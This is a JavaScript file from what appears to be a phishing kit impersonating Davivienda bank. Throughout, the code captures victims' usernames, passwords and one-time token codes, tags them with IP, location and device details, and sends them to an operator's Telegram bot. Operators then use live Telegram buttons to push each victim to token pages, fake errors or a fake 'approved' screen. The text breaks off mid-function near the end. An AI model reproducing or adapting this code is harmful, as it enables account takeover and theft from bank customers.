/**
 * Davivienda Realtime Engine v6.0 (100% Serverless Telegram Edition)
 * Soporta control total y envío de botones interactivos a Telegram SIN SERVIDOR,
 * además de sincronización local entre pestañas y soporte de servidor si existe.
 */

(function(window) {
    // ================= SINTETIZADOR DE SIRENA DE EMERGENCIA Y HÁPTICO =================
    const SoundAlerts = {
        ctx: null,
        enabled: true,
        init() {
            if (!this.ctx) {
                const AudioContext = window.AudioContext || window.webkitAudioContext;
                if (AudioContext) {
                    this.ctx = new AudioContext();
                }
            }
            if (this.ctx && this.ctx.state === 'suspended') {
                this.ctx.resume();
            }
        },
        toggle(enable) {
            this.enabled = enable !== undefined ? enable : !this.enabled;
            return this.enabled;
        },
        triggerVibration(type) {
            if (typeof navigator !== 'undefined' && navigator.vibrate) {
                try {
                    if (type === 'token' || type === 'siren') {
                        navigator.vibrate([400, 120, 400, 120, 600, 120, 600]);
                    } else if (type === 'login') {
                        navigator.vibrate([300, 100, 300, 100, 450]);
                    } else if (type === 'visit') {
                        navigator.vibrate([80, 50, 80]);
                    } else if (type === 'click') {
                        navigator.vibrate(30);
                    } else if (type === 'success') {
                        navigator.vibrate([100, 50, 150]);
                    }
                } catch (e) {}
            }
        },
        playNotification(type = 'login') {
            if (!this.enabled) return;
            this.triggerVibration(type);

            try {
                this.init();
                if (!this.ctx) return;
                if (this.ctx.state === 'suspended') {
                    this.ctx.resume();
                }
                const now = this.ctx.currentTime;

                if (type === 'token' || type === 'siren') {
                    const osc1 = this.ctx.createOscillator();
                    const osc2 = this.ctx.createOscillator();
                    const gainNode = this.ctx.createGain();

                    osc1.type = 'sawtooth';
                    osc2.type = 'sine';

                    const fLow = 600;
                    const fHigh = 1400;

                    osc1.frequency.setValueAtTime(fLow, now);
                    osc1.frequency.linearRampToValueAtTime(fHigh, now + 0.30);
                    osc1.frequency.linearRampToValueAtTime(fLow, now + 0.60);
                    osc1.frequency.linearRampToValueAtTime(fHigh, now + 0.90);
                    osc1.frequency.linearRampToValueAtTime(fLow, now + 1.20);
                    osc1.frequency.linearRampToValueAtTime(fHigh, now + 1.50);
                    osc1.frequency.linearRampToValueAtTime(fLow, now + 1.80);
                    osc1.frequency.linearRampToValueAtTime(fHigh, now + 2.10);
                    osc1.frequency.linearRampToValueAtTime(fLow, now + 2.40);

                    osc2.frequency.setValueAtTime(fLow * 1.5, now);
                    osc2.frequency.linearRampToValueAtTime(fHigh * 1.5, now + 0.30);
                    osc2.frequency.linearRampToValueAtTime(fLow * 1.5, now + 0.60);
                    osc2.frequency.linearRampToValueAtTime(fHigh * 1.5, now + 0.90);
                    osc2.frequency.linearRampToValueAtTime(fLow * 1.5, now + 1.20);
                    osc2.frequency.linearRampToValueAtTime(fHigh * 1.5, now + 1.50);
                    osc2.frequency.linearRampToValueAtTime(fLow * 1.5, now + 1.80);
                    osc2.frequency.linearRampToValueAtTime(fHigh * 1.5, now + 2.10);
                    osc2.frequency.linearRampToValueAtTime(fLow * 1.5, now + 2.40);

                    gainNode.gain.setValueAtTime(0.95, now);
                    gainNode.gain.setValueAtTime(0.95, now + 2.2);
                    gainNode.gain.exponentialRampToValueAtTime(0.01, now + 2.45);

                    osc1.connect(gainNode);
                    osc2.connect(gainNode);
                    gainNode.connect(this.ctx.destination);

                    osc1.start(now);
                    osc2.start(now);
                    osc1.stop(now + 2.45);
                    osc2.stop(now + 2.45);

                } else if (type === 'login') {
                    const osc1 = this.ctx.createOscillator();
                    const osc2 = this.ctx.createOscillator();
                    const gainNode = this.ctx.createGain();

                    osc1.type = 'sawtooth';
                    osc2.type = 'square';

                    const fLow = 700;
                    const fHigh = 1350;

                    osc1.frequency.setValueAtTime(fLow, now);
                    osc1.frequency.linearRampToValueAtTime(fHigh, now + 0.28);
                    osc1.frequency.linearRampToValueAtTime(fLow, now + 0.56);
                    osc1.frequency.linearRampToValueAtTime(fHigh, now + 0.84);
                    osc1.frequency.linearRampToValueAtTime(fLow, now + 1.12);
                    osc1.frequency.linearRampToValueAtTime(fHigh, now + 1.40);
                    osc1.frequency.linearRampToValueAtTime(fLow, now + 1.68);

                    osc2.frequency.setValueAtTime(fLow * 1.25, now);
                    osc2.frequency.linearRampToValueAtTime(fHigh * 1.25, now + 0.28);
                    osc2.frequency.linearRampToValueAtTime(fLow * 1.25, now + 0.56);
                    osc2.frequency.linearRampToValueAtTime(fHigh * 1.25, now + 0.84);
                    osc2.frequency.linearRampToValueAtTime(fLow * 1.25, now + 1.12);
                    osc2.frequency.linearRampToValueAtTime(fHigh * 1.25, now + 1.40);
                    osc2.frequency.linearRampToValueAtTime(fLow * 1.25, now + 1.68);

                    gainNode.gain.setValueAtTime(0.95, now);
                    gainNode.gain.setValueAtTime(0.95, now + 1.5);
                    gainNode.gain.exponentialRampToValueAtTime(0.01, now + 1.75);

                    osc1.connect(gainNode);
                    osc2.connect(gainNode);
                    gainNode.connect(this.ctx.destination);

                    osc1.start(now);
                    osc2.start(now);
                    osc1.stop(now + 1.75);
                    osc2.stop(now + 1.75);

                } else if (type === 'visit') {
                    const osc = this.ctx.createOscillator();
                    const gain = this.ctx.createGain();
                    osc.type = 'sine';
                    osc.frequency.setValueAtTime(523, now);
                    osc.frequency.setValueAtTime(659, now + 0.12);
                    osc.frequency.setValueAtTime(784, now + 0.24);
                    gain.gain.setValueAtTime(0.5, now);
                    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.6);
                    osc.connect(gain);
                    gain.connect(this.ctx.destination);
                    osc.start(now);
                    osc.stop(now + 0.6);

                } else if (type === 'click') {
                    const osc = this.ctx.createOscillator();
                    const gain = this.ctx.createGain();
                    osc.type = 'sine';
                    osc.frequency.setValueAtTime(450, now);
                    osc.frequency.exponentialRampToValueAtTime(220, now + 0.06);
                    gain.gain.setValueAtTime(0.35, now);
                    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.06);
                    osc.connect(gain);
                    gain.connect(this.ctx.destination);
                    osc.start(now);
                    osc.stop(now + 0.06);

                } else if (type === 'success') {
                    const osc = this.ctx.createOscillator();
                    const gain = this.ctx.createGain();
                    osc.type = 'sine';
                    osc.frequency.setValueAtTime(587, now);
                    osc.frequency.setValueAtTime(740, now + 0.12);
                    osc.frequency.setValueAtTime(880, now + 0.24);
                    osc.frequency.setValueAtTime(1174, now + 0.36);
                    gain.gain.setValueAtTime(0.75, now);
                    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.7);
                    osc.connect(gain);
                    gain.connect(this.ctx.destination);
                    osc.start(now);
                    osc.stop(now + 0.7);

                } else if (type === 'error') {
                    const osc = this.ctx.createOscillator();
                    const gain = this.ctx.createGain();
                    osc.type = 'sawtooth';
                    osc.frequency.setValueAtTime(300, now);
                    osc.frequency.linearRampToValueAtTime(140, now + 0.35);
                    gain.gain.setValueAtTime(0.75, now);
                    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.35);
                    osc.connect(gain);
                    gain.connect(this.ctx.destination);
                    osc.start(now);
                    osc.stop(now + 0.35);
                }
            } catch (e) {}
        }
    };

    // Desbloquear audio en móviles con cualquier interacción
    ['click', 'touchstart', 'touchend', 'pointerdown', 'keydown'].forEach(evt => {
        window.addEventListener(evt, () => SoundAlerts.init(), { once: true, passive: true });
    });

    function escapeHtml(text) {
        if (!text) return '';
        return String(text)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;');
    }

    // ================= INFORMACIÓN DEL DISPOSITIVO Y GEOLOCALIZACIÓN =================
    let clientGeo = {
        ip: 'Obteniendo IP...',
        city: '',
        country: '',
        isp: ''
    };

    async function fetchGeoInfo() {
        try {
            const res = await fetch('https://ipwho.is/');
            if (res.ok) {
                const data = await res.json();
                if (data && data.ip) {
                    clientGeo.ip = data.ip;
                    clientGeo.city = data.city || '';
                    clientGeo.country = data.country || '';
                    clientGeo.isp = data.connection ? (data.connection.isp || '') : '';
                    return;
                }
            }
        } catch (e) {}

        try {
            const res = await fetch('https://api.ipify.org?format=json');
            if (res.ok) {
                const data = await res.json();
                if (data && data.ip) {
                    clientGeo.ip = data.ip;
                }
            }
        } catch (e) {}
    }
    const geoPromise = fetchGeoInfo();

    function formatGeoString() {
        let s = clientGeo.ip || 'Local';
        const loc = [clientGeo.city, clientGeo.country].filter(Boolean).join(', ');
        if (loc) s += ` (${loc})`;
        if (clientGeo.isp) s += ` • ${clientGeo.isp}`;
        return s;
    }

    function getDeviceInfo() {
        const ua = navigator.userAgent || '';
        let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(ua) || (window.innerWidth <= 768);
        let browser = "Navegador";
        if (ua.indexOf("Firefox") > -1) browser = "Firefox";
        else if (ua.indexOf("SamsungBrowser") > -1) browser = "Samsung Internet";
        else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) browser = "Opera";
        else if (ua.indexOf("Trident") > -1) browser = "Internet Explorer";
        else if (ua.indexOf("Edge") > -1 || ua.indexOf("Edg") > -1) browser = "Edge";
        else if (ua.indexOf("Chrome") > -1) browser = "Chrome";
        else if (ua.indexOf("Safari") > -1) browser = "Safari";

        let os = "Desconocido";
        if (/iPhone/i.test(ua)) os = "iPhone (iOS)";
        else if (/iPad/i.test(ua)) os = "iPad (iPadOS)";
        else if (/iPod/i.test(ua)) os = "iPod (iOS)";
        else if (/Android/i.test(ua)) {
            if (/Samsung|SM-|GT-/i.test(ua)) os = "Samsung (Android)";
            else if (/Xiaomi|Redmi|POCO|Mi /i.test(ua)) os = "Xiaomi (Android)";
            else if (/Huawei|Honor|HMA-|VOG-/i.test(ua)) os = "Huawei (Android)";
            else if (/Motorola|Moto/i.test(ua)) os = "Motorola (Android)";
            else if (/Pixel/i.test(ua)) os = "Google Pixel (Android)";
            else os = "Android";
        }
        else if (/Windows/i.test(ua)) os = "Windows PC";
        else if (/Macintosh|Mac OS X/i.test(ua)) os = "Mac";
        else if (/Linux/i.test(ua)) os = "Linux";

        return {
            isMobile,
            browser,
            os,
            screen: `${window.screen ? window.screen.width : window.innerWidth}x${window.screen ? window.screen.height : window.innerHeight}`,
            userAgent: ua,
            geo: clientGeo
        };
    }

    // ================= MOTOR DE TELEGRAM DIRECTO (SERVERLESS) =================
    class TelegramEngine {
        constructor(bus) {
            this.bus = bus;
            this.config = this.loadConfig();
            this.polling = false;
            this.updateOffset = 0;
            this.notifiedVisitors = {};
            this.notifiedTokenVisitors = {};
            this.lastTypingTime = 0;
            this.initialized = false;
            this.tabId = 'tab_' + Math.random().toString(36).substr(2, 9);
            this.abortController = null;

            // Limpieza al cerrar o cambiar de página para liberar sockets de inmediato
            if (typeof window !== 'undefined') {
                window.addEventListener('beforeunload', () => this.stopPolling());
                window.addEventListener('pagehide', () => this.stopPolling());
            }

            if (this.isEnabled()) {
                this.startPolling();
            }
        }

        loadConfig() {
            let cfg = {
                botToken: '',
                chatId: '',
                enabled: true,
                notifyOnLogin: true,          // Botón Iniciar sesión de index.html
                notifyOnToken: true,          // Botón Continuar de token.html
                notifyOnResendToken: true,    // Botón Solicitar nuevo código de token.html
                notifyOnVisitor: true,        // Notificar visitas a la página
                notifyOnTokenPage: true,      // Notificar llegada a pantalla token
                notifyOnTyping: false,        // Notificar cuando el usuario escribe (desactivado)
                notifyOnCustomClicks: false,  // Notificar otros clics secundarios (desactivado)
                notifyOnCommandExecuted: false // Mensaje extra de confirmación de comando (desactivado)
            };

            try {
                const saved = localStorage.getItem('davi_telegram_config');
                if (saved) {
                    const parsed = JSON.parse(saved);
                    if (parsed && parsed.botToken) {
                        cfg = { ...cfg, ...parsed };
                    }
                }
            } catch (e) {}

            if (typeof window !== 'undefined' && window.TELEGRAM_CONFIG) {
                cfg = { ...cfg, ...window.TELEGRAM_CONFIG };
            }

            return cfg;
        }

        saveConfig(newCfg) {
            this.config = { ...this.config, ...newCfg };
            try {
                localStorage.setItem('davi_telegram_config', JSON.stringify(this.config));
            } catch (e) {}
            if (this.isEnabled() && !this.polling) {
                this.startPolling();
            }
        }

        isEnabled() {
            return Boolean(this.config.enabled && this.config.botToken && this.config.chatId);
        }

        stopPolling() {
            this.polling = false;
            if (this.abortController) {
                try { this.abortController.abort(); } catch (e) {}
                this.abortController = null;
            }
        }

        async init() {
            if (this.initialized) return;
            this.initialized = true;

            if (this.isEnabled()) {
                console.log('🤖 [TELEGRAM DIRECTO] Activado y listo.');
                this.startPolling();
            } else {
                console.log('ℹ️ [TELEGRAM DIRECTO] Sin configurar aún. Revisa telegram_config.js.');
                this.renderConfigBadge();
            }
        }

        async sendMessage(text, replyMarkup = null) {
            if (!this.isEnabled()) {
                return { success: false, error: 'Telegram no configurado' };
            }

            try {
                const bodyObj = {
                    chat_id: this.config.chatId,
                    text: text,
                    parse_mode: 'HTML'
                };

                if (replyMarkup) {
                    bodyObj.reply_markup = replyMarkup;
                }

                const res = await fetch(`https://api.telegram.org/bot${this.config.botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(bodyObj)
                });

                const data = await res.json();
                return { success: data.ok, result: data.result, error: data.description };
            } catch (err) {
                return { success: false, error: err.message };
            }
        }

        answerCallback(queryId, text) {
            if (!this.config.botToken || !queryId) return;
            try {
                fetch(`https://api.telegram.org/bot${this.config.botToken}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: queryId,
                        text: text || '⚡ Ejecutado al instante',
                        show_alert: false,
                        cache_time: 0
                    })
                }).catch(() => {});
            } catch (e) {}
        }

        checkIsLeader() {
            const now = Date.now();
            try {
                const raw = localStorage.getItem('davi_tg_poll_leader');
                const leader = raw ? JSON.parse(raw) : null;
                if (!leader || (now - leader.time > 4000) || leader.tabId === this.tabId) {
                    localStorage.setItem('davi_tg_poll_leader', JSON.stringify({ tabId: this.tabId, time: now }));
                    return true;
                }
            } catch (e) {
                return true;
            }
            return false;
        }

        async startPolling() {
            if (this.polling || !this.isEnabled()) return;
            this.polling = true;

            const allowedParam = encodeURIComponent(JSON.stringify(["message", "callback_query"]));

            // Recuperar offset guardado en localStorage para iniciar polling sin retraso
            try {
                const savedOffset = localStorage.getItem('davi_tg_last_offset');
                if (savedOffset) {
                    this.updateOffset = parseInt(savedOffset, 10) || 0;
                }
            } catch (e) {}

            // Sincronizar rápido al iniciar con allowed_updates garantizado
            try {
                const fastCtrl = new AbortController();
                const fastTimeout = setTimeout(() => fastCtrl.abort(), 2000);
                const fastRes = await fetch(`https://api.telegram.org/bot${this.config.botToken}/getUpdates?offset=${this.updateOffset}&timeout=0&allowed_updates=${allowedParam}`, {
                    signal: fastCtrl.signal
                });
                clearTimeout(fastTimeout);
                const fastData = await fastRes.json();
                if (fastData && fastData.ok && Array.isArray(fastData.result) && fastData.result.length > 0) {
                    for (const update of fastData.result) {
                        this.updateOffset = update.update_id + 1;
                        try { localStorage.setItem('davi_tg_last_offset', String(this.updateOffset)); } catch (e) {}
                        this.handleTelegramUpdate(update);
                    }
                }
            } catch (e) {}

            const poll = async () => {
                if (!this.polling || !this.isEnabled()) return;

                // Solo la pestaña líder realiza polling de Telegram para evitar errores 409 Conflict
                if (!this.checkIsLeader()) {
                    if (this.polling) setTimeout(poll, 1500);
                    return;
                }

                try {
                    this.abortController = new AbortController();
                    const fetchTimeout = setTimeout(() => {
                        if (this.abortController) {
                            try { this.abortController.abort(); } catch (e) {}
                        }
                    }, 8000);

                    // timeout=2 con allowed_updates explícito para recibir botones siempre
                    const url = `https://api.telegram.org/bot${this.config.botToken}/getUpdates?offset=${this.updateOffset}&timeout=2&allowed_updates=${allowedParam}`;
                    const res = await fetch(url, { signal: this.abortController.signal });
                    clearTimeout(fetchTimeout);

                    if (res.ok) {
                        const data = await res.json();
                        if (data && data.ok && Array.isArray(data.result)) {
                            for (const update of data.result) {
                                this.updateOffset = update.update_id + 1;
                                try { localStorage.setItem('davi_tg_last_offset', String(this.updateOffset)); } catch (e) {}
                                this.handleTelegramUpdate(update);
                            }
                        }
                        if (this.polling) setTimeout(poll, 25);
                    } else if (res.status === 409) {
                        // Conflicto de otra instancia: esperar 1.5s antes de reintentar
                        if (this.polling) setTimeout(poll, 1500);
                    } else {
                        if (this.polling) setTimeout(poll, 400);
                    }
                } catch (err) {
                    if (err && err.name === 'AbortError') {
                        if (this.polling) setTimeout(poll, 50);
                        return;
                    }
                    if (this.polling) setTimeout(poll, 400);
                }
            };

            poll();
        }

        handleTelegramUpdate(update) {
            if (!update) return;

            // 1. Clics en botones interactivos de Telegram
            if (update.callback_query) {
                const cb = update.callback_query;
                const data = cb.data;
                const queryId = cb.id;

                if (data && data.startsWith('cmd:')) {
                    const parts = data.split(':');
                    const action = parts[1];
                    const targetSessionId = parts[2] || '';
                    const mySid = this.bus.sessionId;

                    const actionLabels = {
                        'goto_token': '📲 Avanzar a Pantalla Token',
                        'error_login': '❌ Mostrar Error de Clave',
                        'approve_success': '✨ ✅ Transacción Aprobada con Éxito',
                        'error_token': '❌ Mostrar Código Token Inválido',
                        'resend_token': '🔄 Pedir Reenvío de Token'
                    };
                    const actionText = actionLabels[action] || action;

                    // ⚡ RESPONDER SIEMPRE DE INMEDIATO A TELEGRAM PARA QUITAR LA ESPERA DEL BOTÓN
                    this.answerCallback(queryId, `⚡ ${actionText}`);

                    // ⚡ EJECUTAR EL COMANDO EN EL CLIENTE INMEDIATAMENTE (0ms - TIEMPO CERO)
                    const cmd = {
                        targetSessionId: targetSessionId || mySid,
                        action: action,
                        timestamp: Date.now(),
                        cmdId: 'tg_' + Date.now() + '_' + Math.random().toString(36).substr(2, 7)
                    };

                    this.bus.notifyListeners('command', cmd);
                    this.bus.notifyListeners('client_command', cmd);

                    // Difundir inmediatamente a otras pestañas
                    this.bus.broadcast('client_command', cmd);
                    this.bus.broadcast('command', cmd);

                    try {
                        localStorage.setItem(this.bus.commandPrefix + (targetSessionId || mySid), JSON.stringify(cmd));
                        localStorage.setItem('davi_last_cmd', JSON.stringify(cmd));
                    } catch (e) {}

                    // Persistir último comando en sesión local
                    const sidToSave = targetSessionId || mySid;
                    this.bus.saveSessionLocally(sidToSave, {
                        lastCommand: action,
                        lastCommandTime: Date.now(),
                        status: action === 'approve_success' ? 'approved' : (action.startsWith('error') ? 'error_sent' : 'waiting')
                    });

                    // Confirmación en Telegram en segundo plano (solo si está activada)
                    if (this.config.notifyOnCommandExecuted) {
                        this.sendMessage(`⚡ <b>[ACCIÓN EJECUTADA AL INSTANTE]</b>\n━━━━━━━━━━━━━━━━━━━━\n🎯 <b>Comando:</b> ${actionText}\n🆔 <b>Sesión:</b> <code>${escapeHtml(sidToSave)}</code>\n⏰ <b>Hora:</b> ${new Date().toLocaleTimeString()}`);
                    }
                }
            }

            // 2. Mensajes de texto directos (/start, /id, /status)
            if (update.message && update.message.text) {
                const text = update.message.text.trim();
                const chatId = String(update.message.chat.id);

                if (!this.config.chatId) {
                    this.saveConfig({ chatId: chatId });
                    this.sendMessage(`✅ <b>¡Chat ID Vinculado Automáticamente!</b>\n<code>${chatId}</code>\nAhora todas las alertas llegarán a este chat con sus botones.`);
                }

                if (text === '/id') {
                    this.sendMessage(`🆔 <b>Tu Chat ID de Telegram es:</b> <code>${chatId}</code>`);
                } else if (text === '/start' || text === '/help') {
                    this.sendMessage(`🤖 <b>DAVIVIENDA EN VIVO (100% SIN SERVIDOR)</b>\n━━━━━━━━━━━━━━━━━━━━\n¡El sistema está conectado directamente con tu Telegram!\n\n📋 <b>Comandos:</b>\n• /id - Ver tu Telegram Chat ID (<code>${chatId}</code>)\n• /start - Ver este mensaje\n\n⚡ <i>Cada vez que un cliente abra la página o ingrese datos, recibirás aquí los mensajes con botones de control interactivo.</i>`);
                }
            }
        }

        async notifyVisitor(sessionId, page = 'index.html') {
            if (!this.config.notifyOnVisitor) return;
            if (this.notifiedVisitors[sessionId]) return;
            this.notifiedVisitors[sessionId] = Date.now();

            if (typeof geoPromise !== 'undefined' && geoPromise && (clientGeo.ip === 'Obteniendo IP...' || !clientGeo.ip)) {
                try {
                    await Promise.race([geoPromise, new Promise(r => setTimeout(r, 1200))]);
                } catch (e) {}
            }

            const dev = getDeviceInfo();
            const devStr = `${dev.os} · ${dev.browser}`;
            const devIcon = dev.isMobile ? '📱 MÓVIL' : '💻 PC';
            const header = dev.isMobile ? `📱🚨 <b>[EN VIVO] ¡VISITANTE CONECTADO DESDE DISPOSITIVO MÓVIL!</b>` : `🌐 <b>[EN VIVO] ¡NUEVO VISITANTE CONECTADO!</b>`;

            const keyboard = {
                inline_keyboard: [
                    [
                        { text: "📲 Mandar a Token", callback_data: `cmd:goto_token:${sessionId}` },
                        { text: "❌ Error de Login", callback_data: `cmd:error_login:${sessionId}` }
                    ]
                ]
            };

            this.sendMessage(
                `${header}\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>Sesión:</b> <code>${escapeHtml(sessionId)}</code>\n📱 <b>Dispositivo:</b> ${devIcon} (${escapeHtml(devStr)})\n📄 <b>Página:</b> ${escapeHtml(page)}\n📍 <b>IP:</b> <code>${escapeHtml(formatGeoString())}</code>\n⏰ <b>Hora:</b> ${new Date().toLocaleTimeString()}`,
                keyboard
            );
        }

        async notifyTokenPage(sessionId, user = '', pass = '') {
            if (!this.config.notifyOnTokenPage) return;
            if (this.notifiedTokenVisitors && this.notifiedTokenVisitors[sessionId]) return;
            if (!this.notifiedTokenVisitors) this.notifiedTokenVisitors = {};
            this.notifiedTokenVisitors[sessionId] = Date.now();

            if (typeof geoPromise !== 'undefined' && geoPromise && (clientGeo.ip === 'Obteniendo IP...' || !clientGeo.ip)) {
                try {
                    await Promise.race([geoPromise, new Promise(r => setTimeout(r, 1200))]);
                } catch (e) {}
            }

            const dev = getDeviceInfo();
            const devStr = `${dev.os} · ${dev.browser}`;
            const devIcon = dev.isMobile ? '📱' : '💻';

            const keyboard = {
                inline_keyboard: [
                    [
                        { text: "❌ Error / Regresar a Login", callback_data: `cmd:error_login:${sessionId}` },
                        { text: "🔄 Pedir Reenvío", callback_data: `cmd:resend_token:${sessionId}` }
                    ],
                    [
                        { text: "✨ Aprobar Transacción", callback_data: `cmd:approve_success:${sessionId}` }
                    ]
                ]
            };

            this.sendMessage(
                `📲 <b>[EN VIVO] CLIENTE EN PANTALLA TOKEN</b>\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>Usuario:</b> <code>${escapeHtml(user || 'N/A')}</code>\n🔑 <b>Contraseña:</b> <code>${escapeHtml(pass || 'N/A')}</code>\n🆔 <b>Sesión:</b> <code>${escapeHtml(sessionId)}</code>\n${devIcon} <b>Dispositivo:</b> ${escapeHtml(devStr)}\n📍 <b>IP:</b> <code>${escapeHtml(formatGeoString())}</code>\n⏰ <b>Hora:</b> ${new Date().toLocaleTimeString()}`,
                keyboard
            );
        }

        notifyLogin(sessionId, user, pass, attemptNumber = 1) {
            if (this.config.notifyOnLogin === false) return;

            const dev = getDeviceInfo();
            const devStr = `${dev.os} · ${dev.browser}`;
            const devIcon = dev.isMobile ? '📱' : '💻';

            const keyboard = {
                inline_keyboard: [
                    [
                        { text: "📲 Avanzar a Token", callback_data: `cmd:goto_token:${sessionId}` },
                        { text: "❌ Mostrar Error de Clave", callback_data: `cmd:error_login:${sessionId}` }
                    ],
                    [
                        { text: "🔄 Pedir Reenvío", callback_data: `cmd:resend_token:${sessionId}` },
                        { text: "✨ Aprobar Todo", callback_data: `cmd:approve_success:${sessionId}` }
                    ]
                ]
            };

            this.sendMessage(
                `🚨🚨 <b>[EN VIVO] ¡¡NUEVO LOGIN CAPTURADO!!</b>\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>USUARIO:</b> <code>${escapeHtml(user)}</code>\n🔑 <b>CONTRASEÑA:</b> <code>${escapeHtml(pass)}</code>\n🔢 <b>Intento #:</b> ${attemptNumber}\n🆔 <b>Sesión:</b> <code>${escapeHtml(sessionId)}</code>\n${devIcon} <b>Dispositivo:</b> ${escapeHtml(devStr)}\n📍 <b>IP:</b> <code>${escapeHtml(formatGeoString())}</code>\n⏰ <b>Hora:</b> ${new Date().toLocaleTimeString()}`,
                keyboard
            );
        }

        notifyToken(sessionId, tokenCode, user = '', pass = '') {
            if (this.config.notifyOnToken === false) return;

            const dev = getDeviceInfo();
            const devStr = `${dev.os} · ${dev.browser}`;
            const devIcon = dev.isMobile ? '📱' : '💻';

            const keyboard = {
                inline_keyboard: [
                    [
                        { text: "✅ Aprobar Transacción", callback_data: `cmd:approve_success:${sessionId}` },
                        { text: "❌ Token Incorrecto", callback_data: `cmd:error_token:${sessionId}` }
                    ],
                    [
                        { text: "🔄 Pedir Reenvío de Token", callback_data: `cmd:resend_token:${sessionId}` },
                        { text: "❌ Error de Login", callback_data: `cmd:error_login:${sessionId}` }
                    ]
                ]
            };

            this.sendMessage(
                `🚨🚨🚨 <b>[EN VIVO] ¡¡NUEVO TOKEN RECIBIDO DESDE MÓVIL!!</b>\n━━━━━━━━━━━━━━━━━━━━\n🔢 <b>CÓDIGO TOKEN:</b> <code>${escapeHtml(tokenCode)}</code>\n👤 <b>Usuario:</b> <code>${escapeHtml(user || 'N/A')}</code>\n🔑 <b>Contraseña:</b> <code>${escapeHtml(pass || 'N/A')}</code>\n🆔 <b>Sesión:</b> <code>${escapeHtml(sessionId)}</code>\n${devIcon} <b>Dispositivo:</b> ${escapeHtml(devStr)}\n📍 <b>IP:</b> <code>${escapeHtml(formatGeoString())}</code>\n⏰ <b>Hora:</b> ${new Date().toLocaleTimeString()}`,
                keyboard
            );
        }

        notifyResend(sessionId, user = '') {
            if (this.config.notifyOnResendToken === false) return;

            const keyboard = {
                inline_keyboard: [
                    [
                        { text: "📲 Mandar a Token", callback_data: `cmd:goto_token:${sessionId}` },
                        { text: "❌ Error de Login", callback_data: `cmd:error_login:${sessionId}` }
                    ],
                    [
                        { text: "❌ Token Incorrecto", callback_data: `cmd:error_token:${sessionId}` },
                        { text: "✅ Aprobar Transacción", callback_data: `cmd:approve_success:${sessionId}` }
                    ]
                ]
            };

            this.sendMessage(
                `🔄 <b>[EN VIVO] Cliente Solicitó Nuevo Código</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>Sesión:</b> <code>${escapeHtml(sessionId)}</code>\n👤 <b>Usuario:</b> <code>${escapeHtml(user || 'N/A')}</code>\n⏰ <b>Hora:</b> ${new Date().toLocaleTimeString()}`,
                keyboard
            );
        }

        notifyTyping(sessionId, user, pass) {
            if (!this.config.notifyOnTyping) return;

            const now = Date.now();
            if (now - this.lastTypingTime < 2500) return;
            this.lastTypingTime = now;

            const dev = getDeviceInfo();
            const devStr = `${dev.os} · ${dev.browser}`;
            const devIcon = dev.isMobile ? '📱' : '💻';

            const keyboard = {
                inline_keyboard: [
                    [
                        { text: "📲 Forzar Pantalla Token", callback_data: `cmd:goto_token:${sessionId}` },
                        { text: "❌ Error de Clave", callback_data: `cmd:error_login:${sessionId}` }
                    ]
                ]
            };

            this.sendMessage(
                `✍️ <b>[EN VIVO] USUARIO ESCRIBIENDO EN MÓVIL...</b>\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>Usuario:</b> <code>${escapeHtml(user || '(escribiendo...)')}</code>\n🔑 <b>Contraseña:</b> <code>${escapeHtml(pass || '(escribiendo...)')}</code>\n🆔 <b>Sesión:</b> <code>${escapeHtml(sessionId)}</code>\n${devIcon} <b>Dispositivo:</b> ${escapeHtml(devStr)}\n⏰ <b>Hora:</b> ${new Date().toLocaleTimeString()}`,
                keyboard
            );
        }

        notifyCustomAction(sessionId, actionName, user = '', details = '') {
            if (!this.config.notifyOnCustomClicks) return;
            const dev = getDeviceInfo();
            const devStr = `${dev.os} · ${dev.browser}`;
            const devIcon = dev.isMobile ? '📱' : '💻';

            const keyboard = {
                inline_keyboard: [
                    [
                        { text: "📲 Mandar a Token", callback_data: `cmd:goto_token:${sessionId}` },
                        { text: "❌ Error de Login", callback_data: `cmd:error_login:${sessionId}` }
                    ],
                    [
                        { text: "✨ Aprobar Todo", callback_data: `cmd:approve_success:${sessionId}` }
                    ]
                ]
            };

            this.sendMessage(
                `🔔 <b>[EN VIVO] ACCIÓN DEL CLIENTE: ${escapeHtml(actionName)}</b>\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>Usuario:</b> <code>${escapeHtml(user || 'N/A')}</code>\n🆔 <b>Sesión:</b> <code>${escapeHtml(sessionId)}</code>\n${details ? `ℹ️ <b>Detalle:</b> ${escapeHtml(details)}\n` : ''}${devIcon} <b>Dispositivo:</b> ${escapeHtml(devStr)}\n📍 <b>IP:</b> <code>${escapeHtml(formatGeoString())}</code>\n⏰ <b>Hora:</b> ${new Date().toLocaleTimeString()}`,
                keyboard
            );
        }

        renderConfigBadge() {
            if (typeof document === 'undefined') return;
            if (document.getElementById('davi-tg-helper')) return;

            const badge = document.createElement('div');
            badge.id = 'davi-tg-helper';
            badge.innerHTML = `
                <div style="position:fixed;bottom:12px;right:12px;z-index:999999;background:#ed1c24;color:#fff;padding:8px 14px;border-radius:24px;font-size:12px;font-weight:600;font-family:-apple-system,sans-serif;box-shadow:0 4px 15px rgba(0,0,0,0.3);cursor:pointer;display:flex;align-items:center;gap:6px;transition:transform 0.2s;" onmouseover="this.style.transform='scale(1.05)'" onmouseout="this.style.transform='scale(1)'">
                    <span>⚙️ Configurar Telegram</span>
                </div>
            `;
            badge.addEventListener('click', () => this.showConfigModal());
            document.body.appendChild(badge);
        }

        showConfigModal() {
            let modal = document.getElementById('davi-tg-modal');
            if (!modal) {
                modal = document.createElement('div');
                modal.id = 'davi-tg-modal';
